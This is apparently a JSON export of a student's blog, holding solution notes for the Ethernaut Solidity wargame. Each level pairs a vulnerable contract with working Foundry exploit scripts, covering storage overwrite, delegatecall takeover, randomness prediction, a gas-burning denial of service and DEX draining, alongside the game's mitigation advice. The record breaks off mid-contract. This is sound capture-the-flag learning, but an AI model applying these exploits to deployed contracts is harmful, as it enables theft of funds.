{"/about/":{"data":{"":"","#":"Me Software engineer who lives in Paris üóºü•êüá´üá∑ü•êüá´üá∑ \u003c- (this is not me but heh)\nJob Intern at BPCE, I work on web3 R\u0026D projects. I started my blockchain journey (as something serious) a few months ago.\nPassionate about innovation, decentralization and software resilience.\nMy main focus is the Ethereum ecosystem Œû\nInterests A few things I like to do in my free time\nüõπ Skateboarding üçø Watching movies with my friends üíª Coding is a hobby too Education üéì I‚Äôm still a student at 42 School aming for a master degree in computer science."},"title":"About"},"/projects/":{"data":{"":" Here you can find some projects I have done The Ethernaut Node Guardians Crypto Zombies "},"title":"Projects"},"/projects/ethernaut/":{"data":{"":" The Ethernaut is a Web3/Solidity based wargame inspired by overthewire.org, played in the Ethereum Virtual Machine. Each level is a smart contract that needs to be ‚Äòhacked‚Äô. The game is 100% open source and all levels are contributions made by other players.\nHere you will find my notes on the levels I have solved. Currently, they are not meant to be read as a comprehensive guide to understanding Ethernaut levels.\nMy primary focus is on solving the levels, and these notes act as checkpoints for my understanding.\nHello Ethernaut Fallback Fal1out Coin Flip Telephone Token Delegation Force Vault King Re-entrancy Elevator Elevator Gatekeeper One Gatekeeper Two Naught Coin Preservation Recovery Magic Number Alien Codex Denial Shop Dex Dex Two Puzzle Wallet Motorbike Double Entry Point Good Samaritan Gatekeeper Three Switch "},"title":"The Ethernaut"},"/projects/ethernaut/alien-codex-d14fa389394f4031b7c2ffcdeeebeb56/":{"data":{"":" You‚Äôve uncovered an Alien contract. Claim ownership to complete the level.\nThings that might help\nUnderstanding how array storage works Understanding ABI specifications Using a very underhanded approach // SPDX-License-Identifier: MIT pragma solidity ^0.5.0; import '../helpers/Ownable-05.sol'; contract AlienCodex is Ownable { bool public contact; bytes32[] public codex; modifier contacted() { assert(contact); _; } function makeContact() public { contact = true; } function record(bytes32 _content) contacted public { codex.push(_content); } function retract() contacted public { codex.length--; } function revise(uint i, bytes32 _content) contacted public { codex[i] = _content; } } Solution:\n// SPDX-License-Identifier: UNLICENSED pragma solidity ^0.8.13; import \"forge-std/Script.sol\"; import \"forge-std/console.sol\"; interface AlienCodex { function contact() external returns(bool); function codex() external returns(bytes32[] memory); function makeContact() external; function retract() external; function revise(uint i, bytes32 _content) external; function owner() external returns(address); } contract POC is Script { function run() external { uint256 deployerPrivateKey = vm.envUint(\"PRIVATE_KEY\"); address pubKey = vm.envAddress(\"PUBLIC_KEY\"); address addr = vm.envAddress(\"INSTANCE_19\"); vm.startBroadcast(deployerPrivateKey); AlienCodex codex = AlienCodex(addr); // codex array at slot 1 =\u003e first elt in the array at slot keccak256(1) uint eltSlot = uint(keccak256(abi.encode(1))); // owner address is stored on the first 20 bytes of slot 0 uint distanceFromSlot0 = type(uint).max - eltSlot; codex.makeContact(); // length underflow; now codex is of length type(uint).max // which allows us to reach every possible slot of the contract codex.retract(); // write attacker's address at slot 0 codex.revise(distanceFromSlot0 + 1, bytes32(abi.encode(pubKey))); console.logAddress(codex.owner()); vm.stopBroadcast(); } } This level exploits the fact that the EVM doesn‚Äôt validate an array‚Äôs ABI-encoded length vs its actual payload.\nAdditionally, it exploits the arithmetic underflow of array length, by expanding the array‚Äôs bounds to the entire storage area of 2^256. The user is then able to modify all contract storage.\nBoth vulnerabilities are inspired by 2017‚Äôs Underhanded coding contest"},"title":"Alien Codex"},"/projects/ethernaut/coin-flip-c27578d40d2f427d968d5623d7000dab/":{"data":{"":" This is a coin flipping game where you need to build up your winning streak by guessing the outcome of a coin flip. To complete this level you‚Äôll need to use your psychic abilities to guess the correct outcome 10 times in a row.\nThings that might help\nSee the \"?\" page above in the top right corner menu, section ‚ÄúBeyond the console‚Äù Here is the first version of my solution:\n// SPDX-License-Identifier: UNLICENSED pragma solidity ^0.8.13; import \"forge-std/Script.sol\"; import \"forge-std/console.sol\"; interface CoinFlip { function consecutiveWins() external returns (uint256); function flip(bool _guess) external returns (bool); } contract POC is Script { function run() external { uint256 deployerPrivateKey = vm.envUint(\"PRIVATE_KEY\"); address addr = vm.envAddress(\"INSTANCE_03\"); uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968; vm.startBroadcast(deployerPrivateKey); CoinFlip instance = CoinFlip(addr); for (uint i = 0; i \u003c 10; i++) { uint256 blockValue = uint256(blockhash(block.number - 1)); uint coinFlip = blockValue / FACTOR; bool side = coinFlip == 1 ? true : false; instance.flip(side); console.logUint(instance.consecutiveWins()); } vm.stopBroadcast(); } } It doesn‚Äôt work because block.number doesn‚Äôt change between executionn of the loop.\nlink_preview\nIt seems that theire is on way to do this so let‚Äôs go by hand for now‚Ä¶\nHere is the forge script:\n// SPDX-License-Identifier: UNLICENSED pragma solidity ^0.8.13; import \"forge-std/Script.sol\"; import \"forge-std/console.sol\"; interface CoinFlip { function consecutiveWins() external returns (uint256); function flip(bool _guess) external returns (bool); } contract POC is Script { function run() external { uint256 deployerPrivateKey = vm.envUint(\"PRIVATE_KEY\"); address addr = vm.envAddress(\"INSTANCE_03\"); uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968; vm.startBroadcast(deployerPrivateKey); CoinFlip instance = CoinFlip(addr); uint256 blockValue = uint256(blockhash(block.number - 1)); uint coinFlip = blockValue / FACTOR; bool side = coinFlip == 1 ? true : false; instance.flip(side); console.logUint(instance.consecutiveWins()); vm.stopBroadcast(); } } Actually this is too complecated. So let‚Äôs build a contract that will do th attack for us with check in it so that we are sure to get a valid result.\nhere is my attacker contract:\n// SPDX-License-Identifier: MIT pragma solidity ^0.8.0; interface CoinFlip { function consecutiveWins() external returns (uint256); function flip(bool _guess) external returns (bool); } contract CoinFlipAttack { uint256 public consecutiveWins; uint256 lastHash; uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968; CoinFlip coinFlipTarget; constructor(address instanceAdrress) { coinFlipTarget = CoinFlip(instanceAdrress); consecutiveWins = 0; } function attack() public { uint256 blockValue = uint256(blockhash(block.number - 1)); if (lastHash != blockValue) { lastHash = blockValue; uint256 coinFlip = blockValue / FACTOR; bool side = coinFlip == 1 ? true : false; coinFlipTarget.flip(side); consecutiveWins++; } } } Let‚Äôs deploy this contract :\nforge create --rpc-url $SEPOLIA_RPC_URL --private-key $PRIVATE_KEY src/03.sol:CoinFlipAttack --constructor-args $INSTANCE_03 Now we can call our attack() function with cast send:\ncast send $ATTACKER_03 --rpc-url $SEPOLIA_RPC_URL --private-key $PRIVATE_KEY \"attack()\" We can also look up the current consecutive wins on the attacked contract using the following cast command:\ncast call $INSTANCE_03 --rpc-url $SEPOLIA_RPC_URL \"consecutiveWins()\" "},"title":"Coin Flip"},"/projects/ethernaut/delegation-0c005c8b167c4966926771bad0ff918c/":{"data":{"":" The goal of this level is for you to claim ownership of the instance you are given.\nThings that might help\nLook into Solidity‚Äôs documentation on the delegatecall low level function, how it works, how it can be used to delegate operations to on-chain libraries, and what implications it has on execution scope. Fallback methods Method ids // SPDX-License-Identifier: MIT pragma solidity ^0.8.0; contract Delegate { address public owner; constructor(address _owner) { owner = _owner; } function pwn() public { owner = msg.sender; } } contract Delegation { address public owner; Delegate delegate; constructor(address _delegateAddress) { delegate = Delegate(_delegateAddress); owner = msg.sender; } fallback() external { (bool result,) = address(delegate).delegatecall(msg.data); if (result) { this; } } } Solution:\n// SPDX-License-Identifier: UNLICENSED pragma solidity ^0.8.13; import \"forge-std/Script.sol\"; import \"forge-std/console.sol\"; interface Delegation { function owner() external returns(address); fallback() external; } contract POC is Script { function run() external { uint256 deployerPrivateKey = vm.envUint(\"PRIVATE_KEY\"); address addr = vm.envAddress(\"INSTANCE_06\"); vm.startBroadcast(deployerPrivateKey); Delegation delegation = Delegation(addr); console.logAddress(delegation.owner()); bytes memory data = abi.encodeWithSignature(\"pwn()\"); (bool result, ) = address(delegation).call(data); if (result) { } console.logAddress(delegation.owner()); vm.stopBroadcast(); } } Usage of delegatecall is particularly risky and has been used as an attack vector on multiple historic hacks. With it, your contract is practically saying ‚Äúhere, -other contract- or -other library-, do whatever you want with my state‚Äù. Delegates have complete access to your contract‚Äôs state. The delegatecall function is a powerful feature, but a dangerous one, and must be used with extreme care.\nPlease refer to the The Parity Wallet Hack Explained article for an accurate explanation of how this idea was used to steal 30M USD."},"title":"Delegation"},"/projects/ethernaut/denial-edd8839ce63a4a2194adfd2905ad4940/":{"data":{"":" This is a simple wallet that drips funds over time. You can withdraw the funds slowly by becoming a withdrawing partner.\nIf you can deny the owner from withdrawing funds when they call withdraw() (whilst the contract still has funds, and the transaction is of 1M gas or less) you will win this level.\n// SPDX-License-Identifier: MIT pragma solidity ^0.8.0; contract Denial { address public partner; // withdrawal partner - pay the gas, split the withdraw address public constant owner = address(0xA9E); uint timeLastWithdrawn; mapping(address =\u003e uint) withdrawPartnerBalances; // keep track of partners balances function setWithdrawPartner(address _partner) public { partner = _partner; } // withdraw 1% to recipient and 1% to owner function withdraw() public { uint amountToSend = address(this).balance / 100; // perform a call without checking return // The recipient can revert, the owner will still get their share partner.call{value:amountToSend}(\"\"); payable(owner).transfer(amountToSend); // keep track of last withdrawal time timeLastWithdrawn = block.timestamp; withdrawPartnerBalances[partner] += amountToSend; } // allow deposit of funds receive() external payable {} // convenience function function contractBalance() public view returns (uint) { return address(this).balance; } } Solution:\n// SPDX-License-Identifier: UNLICENSED pragma solidity ^0.8.13; import \"forge-std/Script.sol\"; import \"forge-std/console.sol\"; import {Attacker,Denial} from '../src/20.sol'; contract POC is Script { function run() external { uint256 deployerPrivateKey = vm.envUint(\"PRIVATE_KEY\"); address addr = vm.envAddress(\"INSTANCE_20\"); vm.startBroadcast(deployerPrivateKey); new Attacker(addr); vm.stopBroadcast(); } } // SPDX-License-Identifier: UNLICENSED pragma solidity ^0.8.13; interface Denial { function setWithdrawPartner(address _partner) external; } contract Attacker { Denial denial; constructor(address _denial) { denial = Denial(_denial); denial.setWithdrawPartner(address(this)); } // Classic DOS attack receive() external payable { uint i = 0; while (true) { i++; } } } This level demonstrates that external calls to unknown contracts can still create denial of service attack vectors if a fixed amount of gas is not specified.\nIf you are using a low level call to continue executing in the event an external call reverts, ensure that you specify a fixed gas stipend. For example call.gas(100000).value().\nTypically one should follow the checks-effects-interactions pattern to avoid reentrancy attacks, there can be other circumstances (such as multiple external calls at the end of a function) where issues such as this can arise.\nNote: An external CALL can use at most 63/64 of the gas currently available at the time of the CALL. Thus, depending on how much gas is required to complete a transaction, a transaction of sufficiently high gas (i.e. one such that 1/64 of the gas is capable of completing the remaining opcodes in the parent call) can be used to mitigate this particular attack."},"title":"Denial"},"/projects/ethernaut/dex-2e8b616a5bd64b05874e71b8b4a30ac7/":{"data":{"":"","#":" The goal of this level is for you to hack the basic DEX contract below and steal the funds by price manipulation.\nYou will start with 10 tokens of token1 and 10 of token2. The DEX contract starts with 100 of each token.\nYou will be successful in this level if you manage to drain all of at least 1 of the 2 tokens from the contract, and allow the contract to report a ‚Äúbad‚Äù price of the assets.\nQuick note Normally, when you make a swap with an ERC20 token, you have to approve the contract to spend your tokens for you. To keep with the syntax of the game, we‚Äôve just added the approve method to the contract itself. So feel free to use contract.approve(contract.address, \u003cuint amount\u003e) instead of calling the tokens directly, and it will automatically approve spending the two tokens by the desired amount. Feel free to ignore the SwappableToken contract otherwise.\nThings that might help:\nHow is the price of the token calculated? How does the swap method work? How do you approve a transaction of an ERC20? Theres more than one way to interact with a contract! Remix might help What does ‚ÄúAt Address‚Äù do? // SPDX-License-Identifier: MIT pragma solidity ^0.8.0; import \"openzeppelin-contracts-08/token/ERC20/IERC20.sol\"; import \"openzeppelin-contracts-08/token/ERC20/ERC20.sol\"; import 'openzeppelin-contracts-08/access/Ownable.sol'; contract Dex is Ownable { address public token1; address public token2; constructor() {} function setTokens(address _token1, address _token2) public onlyOwner { token1 = _token1; token2 = _token2; } function addLiquidity(address token_address, uint amount) public onlyOwner { IERC20(token_address).transferFrom(msg.sender, address(this), amount); } function swap(address from, address to, uint amount) public { require((from == token1 \u0026\u0026 to == token2) || (from == token2 \u0026\u0026 to == token1), \"Invalid tokens\"); require(IERC20(from).balanceOf(msg.sender) \u003e= amount, \"Not enough to swap\"); uint swapAmount = getSwapPrice(from, to, amount); IERC20(from).transferFrom(msg.sender, address(this), amount); IERC20(to).approve(address(this), swapAmount); IERC20(to).transferFrom(address(this), msg.sender, swapAmount); } function getSwapPrice(address from, address to, uint amount) public view returns(uint){ return((amount * IERC20(to).balanceOf(address(this)))/IERC20(from).balanceOf(address(this))); } function approve(address spender, uint amount) public { SwappableToken(token1).approve(msg.sender, spender, amount); SwappableToken(token2).approve(msg.sender, spender, amount); } function balanceOf(address token, address account) public view returns (uint){ return IERC20(token).balanceOf(account); } } contract SwappableToken is ERC20 { address private _dex; constructor(address dexInstance, string memory name, string memory symbol, uint256 initialSupply) ERC20(name, symbol) { _mint(msg.sender, initialSupply); _dex = dexInstance; } function approve(address owner, address spender, uint256 amount) public { require(owner != _dex, \"InvalidApprover\"); super._approve(owner, spender, amount); } } Solution:\n// SPDX-License-Identifier: UNLICENSED pragma solidity ^0.8.13; import \"forge-std/Script.sol\"; import \"forge-std/console.sol\"; import {Attacker,Dex,IERC20} from '../src/22.sol'; contract POC is Script { function run() external { uint256 deployerPrivateKey = vm.envUint(\"PRIVATE_KEY\"); address addr = vm.envAddress(\"INSTANCE_22\"); vm.startBroadcast(deployerPrivateKey); Attacker attacker = new Attacker(addr); IERC20 t1 = IERC20(attacker.token1()); IERC20 t2 = IERC20(attacker.token2()); t1.transfer(address(attacker), 10); t2.transfer(address(attacker), 10); uint i = attacker.attack(); console.log('Balance token1: %s', t1.balanceOf(addr)); console.log('Balance token2: %s', t2.balanceOf(addr)); console.log('Iteration count: %s', i); vm.stopBroadcast(); } } // SPDX-License-Identifier: UNLICENSED pragma solidity ^0.8.13; interface Dex { function swap(address from, address to, uint amount) external; function token1() external returns(address); function token2() external returns(address); function approve(address spender, uint amount) external; function getSwapPrice(address from, address to, uint amount) external view returns(uint); } interface IERC20 { function transfer(address to, uint256 value) external returns (bool); function balanceOf(address account) external view returns (uint256); } contract Attacker { address public dex; address public token1; address public token2; constructor(address _dex) { dex = _dex; token1 = Dex(dex).token1(); token2 = Dex(dex).token2(); } function getAmount(uint _startAmount, address _from, address _to) public view returns(uint finalAmount){ finalAmount = _startAmount; Dex d = Dex(dex); while (d.getSwapPrice(_from, _to, finalAmount) \u003e 110) { finalAmount--; if (finalAmount == 0) { return 0; } } } function attack() public returns(uint i){ IERC20(token1).transfer(address(dex), 10); Dex(dex).approve(address(dex), type(uint).max); IERC20 t1 = IERC20(token1); IERC20 t2 = IERC20(token2); Dex d = Dex(dex); while (true) { d.swap(token2, token1, getAmount(t2.balanceOf(address(this)), token2, token1)); if (IERC20(token1).balanceOf(address(dex)) == 0) { break; } d.swap(token1, token2, getAmount(t1.balanceOf(address(this)), token1, token2)); if (t2.balanceOf(address(dex)) == 0) { break; } i++; } } } The integer math portion aside, getting prices or any sort of data from any single source is a massive attack vector in smart contracts.\nYou can clearly see from this example, that someone with a lot of capital could manipulate the price in one fell swoop, and cause any applications relying on it to use the the wrong price.\nThe exchange itself is decentralized, but the price of the asset is centralized, since it comes from 1 dex. However, if we were to consider tokens that represent actual assets rather than fictitious ones, most of them would have exchange pairs in several dexes and networks. This would decrease the effect on the asset‚Äôs price in case a specific dex is targeted by an attack like this.\nOracles are used to get data into and out of smart contracts.\nChainlink Data Feeds are a secure, reliable, way to get decentralized data into your smart contracts. They have a vast library of many different sources, and also offer secure randomness, ability to make any API call, modular oracle network creation, upkeep, actions, and maintainance, and unlimited customization.\nUniswap TWAP Oracles relies on a time weighted price model called TWAP. While the design can be attractive, this protocol heavily depends on the liquidity of the DEX protocol, and if this is too low, prices can be easily manipulated.\nHere is an example of getting the price of Bitcoin in USD from a Chainlink data feed (on the Sepolia testnet):\n// SPDX-License-Identifier: MIT pragma solidity ^0.8.7; import \"@chainlink/contracts/src/v0.8/interfaces/AggregatorV3Interface.sol\"; contract PriceConsumerV3 { AggregatorV3Interface internal priceFeed; /** * Network: Sepolia * Aggregator: BTC/USD * Address: 0x1b44F3514812d835EB1BDB0acB33d3fA3351Ee43 */ constructor() { priceFeed = AggregatorV3Interface( 0x1b44F3514812d835EB1BDB0acB33d3fA3351Ee43 ); } /** * Returns the latest price. */ function getLatestPrice() public view returns (int) { // prettier-ignore ( /* uint80 roundID */, int price, /*uint startedAt*/, /*uint timeStamp*/, /*uint80 answeredInRound*/ ) = priceFeed.latestRoundData(); return price; } } Try it on Remix Check the Chainlink feed page to see that the price of Bitcoin is queried from up to 31 different sources.\nYou can check also, the list all Chainlink price feeds addresses."},"title":"Dex"},"/projects/ethernaut/dex-two-f9572c09096541d3afbe107d66ac7fd9/":{"data":{"":" This level will ask you to break DexTwo, a subtlely modified Dex contract from the previous level, in a different way.\nYou need to drain all balances of token1 and token2 from the DexTwo contract to succeed in this level.\nYou will still start with 10 tokens of token1 and 10 of token2. The DEX contract still starts with 100 of each token.\nThings that might help:\nHow has the swap method been modified? // SPDX-License-Identifier: MIT pragma solidity ^0.8.0; import \"openzeppelin-contracts-08/token/ERC20/IERC20.sol\"; import \"openzeppelin-contracts-08/token/ERC20/ERC20.sol\"; import 'openzeppelin-contracts-08/access/Ownable.sol'; contract DexTwo is Ownable { address public token1; address public token2; constructor() {} function setTokens(address _token1, address _token2) public onlyOwner { token1 = _token1; token2 = _token2; } function add_liquidity(address token_address, uint amount) public onlyOwner { IERC20(token_address).transferFrom(msg.sender, address(this), amount); } function swap(address from, address to, uint amount) public { require(IERC20(from).balanceOf(msg.sender) \u003e= amount, \"Not enough to swap\"); uint swapAmount = getSwapAmount(from, to, amount); IERC20(from).transferFrom(msg.sender, address(this), amount); IERC20(to).approve(address(this), swapAmount); IERC20(to).transferFrom(address(this), msg.sender, swapAmount); } function getSwapAmount(address from, address to, uint amount) public view returns(uint){ return((amount * IERC20(to).balanceOf(address(this)))/IERC20(from).balanceOf(address(this))); } function approve(address spender, uint amount) public { SwappableTokenTwo(token1).approve(msg.sender, spender, amount); SwappableTokenTwo(token2).approve(msg.sender, spender, amount); } function balanceOf(address token, address account) public view returns (uint){ return IERC20(token).balanceOf(account); } } contract SwappableTokenTwo is ERC20 { address private _dex; constructor(address dexInstance, string memory name, string memory symbol, uint initialSupply) ERC20(name, symbol) { _mint(msg.sender, initialSupply); _dex = dexInstance; } function approve(address owner, address spender, uint256 amount) public { require(owner != _dex, \"InvalidApprover\"); super._approve(owner, spender, amount); } } Solution:\n// SPDX-License-Identifier: UNLICENSED pragma solidity ^0.8.13; import \"forge-std/Script.sol\"; import \"forge-std/console.sol\"; import {Attacker,DexTwo,IERC20} from '../src/23.sol'; contract POC is Script { function run() external { uint256 deployerPrivateKey = vm.envUint(\"PRIVATE_KEY\"); address addr = vm.envAddress(\"INSTANCE_23\"); vm.startBroadcast(deployerPrivateKey); Attacker attacker = new Attacker(addr); DexTwo dex2 = DexTwo(addr); IERC20 token1 = IERC20(dex2.token1()); IERC20 token2 = IERC20(dex2.token2()); console.log('token1 %s', token1.balanceOf(address(dex2))); console.log('token2 %s', token2.balanceOf(address(dex2))); attacker.attack(); console.log('token1 %s', token1.balanceOf(address(dex2))); console.log('token2 %s', token2.balanceOf(address(dex2))); vm.stopBroadcast(); } } // SPDX-License-Identifier: UNLICENSED pragma solidity ^0.8.13; interface DexTwo { function swap(address from, address to, uint amount) external; function approve(address spender, uint amount) external; function token1() external returns(address); function token2() external returns(address); } interface IERC20 { function balanceOf(address) external returns(uint); function transferFrom( address from, address to, uint256 amount ) external returns (bool); } contract Attacker is IERC20 { address public dexTwo; constructor(address _dexTwo) { dexTwo = _dexTwo; } function balanceOf(address) public pure returns(uint) { return (100); } function transferFrom( address from, address to, uint256 amount ) public virtual returns (bool) {} function attack() public { DexTwo d = DexTwo(dexTwo); d.swap(address(this), d.token1(), 100); d.swap(address(this), d.token2(), 100); } } As we‚Äôve repeatedly seen, interaction between contracts can be a source of unexpected behavior.\nJust because a contract claims to implement the ERC20 spec does not mean it‚Äôs trust worthy.\nSome tokens deviate from the ERC20 spec by not returning a boolean value from their transfer methods. See Missing return value bug - At least 130 tokens affected.\nOther ERC20 tokens, especially those designed by adversaries could behave more maliciously.\nIf you design a DEX where anyone could list their own tokens without the permission of a central authority, then the correctness of the DEX could depend on the interaction of the DEX contract and the token contracts being traded."},"title":"Dex Two"},"/projects/ethernaut/double-entry-point-4add59a518494b4b8275112702b0ec07/":{"data":{"":" This level features a CryptoVault with special functionality, the sweepToken function. This is a common function used to retrieve tokens stuck in a contract. The CryptoVault operates with an underlying token that can‚Äôt be swept, as it is an important core logic component of the CryptoVault. Any other tokens can be swept.\nThe underlying token is an instance of the DET token implemented in the DoubleEntryPoint contract definition and the CryptoVault holds 100 units of it. Additionally the CryptoVault also holds 100 of LegacyToken LGT.\nIn this level you should figure out where the bug is in CryptoVault and protect it from being drained out of tokens.\nThe contract features a Forta contract where any user can register its own detection bot contract. Forta is a decentralized, community-based monitoring network to detect threats and anomalies on DeFi, NFT, governance, bridges and other Web3 systems as quickly as possible. Your job is to implement a detection bot and register it in the Forta contract. The bot‚Äôs implementation will need to raise correct alerts to prevent potential attacks or bug exploits.\nThings that might help:\nHow does a double entry point work for a token contract? // SPDX-License-Identifier: MIT pragma solidity ^0.8.0; import \"openzeppelin-contracts-08/access/Ownable.sol\"; import \"openzeppelin-contracts-08/token/ERC20/ERC20.sol\"; interface DelegateERC20 { function delegateTransfer(address to, uint256 value, address origSender) external returns (bool); } interface IDetectionBot { function handleTransaction(address user, bytes calldata msgData) external; } interface IForta { function setDetectionBot(address detectionBotAddress) external; function notify(address user, bytes calldata msgData) external; function raiseAlert(address user) external; } contract Forta is IForta { mapping(address =\u003e IDetectionBot) public usersDetectionBots; mapping(address =\u003e uint256) public botRaisedAlerts; function setDetectionBot(address detectionBotAddress) external override { usersDetectionBots[msg.sender] = IDetectionBot(detectionBotAddress); } function notify(address user, bytes calldata msgData) external override { if(address(usersDetectionBots[user]) == address(0)) return; try usersDetectionBots[user].handleTransaction(user, msgData) { return; } catch {} } function raiseAlert(address user) external override { if(address(usersDetectionBots[user]) != msg.sender) return; botRaisedAlerts[msg.sender] += 1; } } contract CryptoVault { address public sweptTokensRecipient; IERC20 public underlying; constructor(address recipient) { sweptTokensRecipient = recipient; } function setUnderlying(address latestToken) public { require(address(underlying) == address(0), \"Already set\"); underlying = IERC20(latestToken); } /* ... */ function sweepToken(IERC20 token) public { require(token != underlying, \"Can't transfer underlying token\"); token.transfer(sweptTokensRecipient, token.balanceOf(address(this))); } } contract LegacyToken is ERC20(\"LegacyToken\", \"LGT\"), Ownable { DelegateERC20 public delegate; function mint(address to, uint256 amount) public onlyOwner { _mint(to, amount); } function delegateToNewContract(DelegateERC20 newContract) public onlyOwner { delegate = newContract; } function transfer(address to, uint256 value) public override returns (bool) { if (address(delegate) == address(0)) { return super.transfer(to, value); } else { return delegate.delegateTransfer(to, value, msg.sender); } } } contract DoubleEntryPoint is ERC20(\"DoubleEntryPointToken\", \"DET\"), DelegateERC20, Ownable { address public cryptoVault; address public player; address public delegatedFrom; Forta public forta; constructor(address legacyToken, address vaultAddress, address fortaAddress, address playerAddress) { delegatedFrom = legacyToken; forta = Forta(fortaAddress); player = playerAddress; cryptoVault = vaultAddress; _mint(cryptoVault, 100 ether); } modifier onlyDelegateFrom() { require(msg.sender == delegatedFrom, \"Not legacy contract\"); _; } modifier fortaNotify() { address detectionBot = address(forta.usersDetectionBots(player)); // Cache old number of bot alerts uint256 previousValue = forta.botRaisedAlerts(detectionBot); // Notify Forta forta.notify(player, msg.data); // Continue execution _; // Check if alarms have been raised if(forta.botRaisedAlerts(detectionBot) \u003e previousValue) revert(\"Alert has been triggered, reverting\"); } function delegateTransfer( address to, uint256 value, address origSender ) public override onlyDelegateFrom fortaNotify returns (bool) { _transfer(origSender, to, value); return true; } } Solution:\n// SPDX-License-Identifier: UNLICENSED pragma solidity ^0.8.13; import \"forge-std/Script.sol\"; import \"forge-std/console.sol\"; import {DetectionBot,DelegateERC20,Forta,DoubleEntryPoint,CryptoVault,IERC20,LegacyToken} from '../src/26.sol'; contract POC is Script { function run() external { uint256 deployerPrivateKey = vm.envUint(\"PRIVATE_KEY\"); address addr = vm.envAddress(\"INSTANCE_26\"); vm.startBroadcast(deployerPrivateKey); DoubleEntryPoint doubleEntryPoint = DoubleEntryPoint(addr); CryptoVault vault = CryptoVault(doubleEntryPoint.cryptoVault()); IERC20 underlying = vault.underlying(); Forta forta = doubleEntryPoint.forta(); DetectionBot bot = new DetectionBot(underlying, forta); forta.setDetectionBot(address(bot)); vm.stopBroadcast(); } } // SPDX-License-Identifier: UNLICENSED pragma solidity ^0.8.0; import \"../lib/forge-std/src/console.sol\"; interface IDetectionBot { function handleTransaction(address user, bytes calldata msgData) external; } interface DoubleEntryPoint { function cryptoVault() external returns(address); function player() external returns(address); function delegatedFrom() external returns(address); function forta() external returns(Forta); } interface IERC20 { event Transfer(address indexed from, address indexed to, uint256 value); event Approval(address indexed owner, address indexed spender, uint256 value); function totalSupply() external view returns (uint256); function balanceOf(address account) external view returns (uint256); function transfer(address to, uint256 value) external returns (bool); function allowance(address owner, address spender) external view returns (uint256); function approve(address spender, uint256 value) external returns (bool); function transferFrom(address from, address to, uint256 value) external returns (bool); } interface CryptoVault { function sweptTokensRecipient() external returns(address); function underlying() external returns(IERC20); function setUnderlying(address latestToken) external; function sweepToken(IERC20 token) external; } interface Forta { function setDetectionBot(address detectionBotAddress) external; function notify(address user, bytes calldata msgData) external; function raiseAlert(address user) external; function usersDetectionBots(address) external returns(IDetectionBot); function botRaisedAlerts(address) external returns(uint256); } interface DelegateERC20 { function delegateTransfer(address to, uint256 value, address origSender) external returns (bool); } interface LegacyToken is IERC20 { function delegate() external returns(DelegateERC20); function mint(address to, uint256 amount) external; function delegateToNewContract(DelegateERC20 newContract) external; function transfer(address to, uint256 value) external returns (bool); function owner() external returns(address); } contract DetectionBot { IERC20 underlying; Forta forta; constructor(IERC20 _underlying, Forta _forta) { underlying = _underlying; forta = _forta; } function handleTransaction(address user, bytes calldata msgData) public { // The first 4 bytes on the msgData are the function signature, in order to decode the payload it is required to skip those bytes of the function signature! // reference: \"abi.decode cannot decode msg.data\" \u003c===\u003e https://github.com/ethereum/solidity/issues/6012 (address to,,) = abi.decode(msgData[4:],(address,uint,address)); if (to != address(underlying)) { forta.raiseAlert(user); } } } Congratulations!\nThis is the first experience you have with a Forta bot.\nForta comprises a decentralized network of independent node operators who scan all transactions and block-by-block state changes for outlier transactions and threats. When an issue is detected, node operators send alerts to subscribers of potential risks, which enables them to take action.\nThe presented example is just for educational purpose since Forta bot is not modeled into smart contracts. In Forta, a bot is a code script to detect specific conditions or events, but when an alert is emitted it does not trigger automatic actions - at least not yet. In this level, the bot‚Äôs alert effectively trigger a revert in the transaction, deviating from the intended Forta‚Äôs bot design.\nDetection bots heavily depends on contract‚Äôs final implementations and some might be upgradeable and break bot‚Äôs integrations, but to mitigate that you can even create a specific bot to look for contract upgrades and react to it. Learn how to do it here.\nYou have also passed through a recent security issue that has been uncovered during OpenZeppelin‚Äôs latest collaboration with Compound protocol.\nHaving tokens that present a double entry point is a non-trivial pattern that might affect many protocols. This is because it is commonly assumed to have one contract per token. But it was not the case this time :) You can read the entire details of what happened here."},"title":"Double-Entry-Point"},"/projects/ethernaut/elevator-59c41c694afa45c68e603000da840a2e/":{"data":{"":"","#":" title: Elevator weight: 4 type: docs next: re-entrancy prev: privacy\nLevel11 - ‚≠ê‚≠ê\nThis elevator won‚Äôt let you reach the top of your building. Right?\nThings that might help: Sometimes solidity is not good at keeping promises. This Elevator expects to be used from a Building. // SPDX-License-Identifier: MIT pragma solidity ^0.8.0; interface Building { function isLastFloor(uint) external returns (bool); } contract Elevator { bool public top; uint public floor; function goTo(uint _floor) public { Building building = Building(msg.sender); if (! building.isLastFloor(_floor)) { floor = _floor; top = building.isLastFloor(floor); } } } Solution:\n// SPDX-License-Identifier: UNLICENSED pragma solidity ^0.8.13; interface Elevator { function top() external view returns(bool); function floor() external view returns(uint); function goTo(uint _floor) external; } contract Building { Elevator public elevator; bool lastFloor; function installElevator(address _elevator) public { elevator = Elevator(_elevator); } function isLastFloor(uint) public returns (bool) { if (lastFloor == false) { lastFloor = true; return false; } return true; } function attack(uint _floor) public { elevator.goTo(_floor); } } // SPDX-License-Identifier: UNLICENSED pragma solidity ^0.8.13; import \"forge-std/Script.sol\"; import \"forge-std/console.sol\"; import {Building} from \"../src/11.sol\"; interface Elevator { function top() external view returns(bool); function floor() external view returns(uint); function goTo(uint _floor) external; } contract POC is Script { function run() external { uint256 deployerPrivateKey = vm.envUint(\"PRIVATE_KEY\"); address addr = vm.envAddress(\"INSTANCE_11\"); vm.startBroadcast(deployerPrivateKey); console.logUint(address(addr).balance); Elevator elevator = Elevator(addr); Building building = new Building(); building.installElevator(addr); console.logBool(elevator.top()); console.logUint(elevator.floor()); building.attack(0); console.logBool(elevator.top()); console.logUint(elevator.floor()); vm.stopBroadcast(); } } You can use the view function modifier on an interface in order to prevent state modifications. The pure modifier also prevents functions from modifying the state. Make sure you read Solidity‚Äôs documentation and learn its caveats.\nAn alternative way to solve this level is to build a view function which returns different results depends on input data but don‚Äôt modify state, e.g. gasleft()."},"title":"Elevator"},"/projects/ethernaut/fal1out-eb9fe61a4da943248fa363e1918dd9f6/":{"data":{"":" // SPDX-License-Identifier: MIT pragma solidity ^0.6.0; import 'openzeppelin-contracts-06/math/SafeMath.sol'; contract Fallout { using SafeMath for uint256; mapping (address =\u003e uint) allocations; address payable public owner; /* constructor */ function Fal1out() public payable { owner = msg.sender; allocations[owner] = msg.value; } modifier onlyOwner 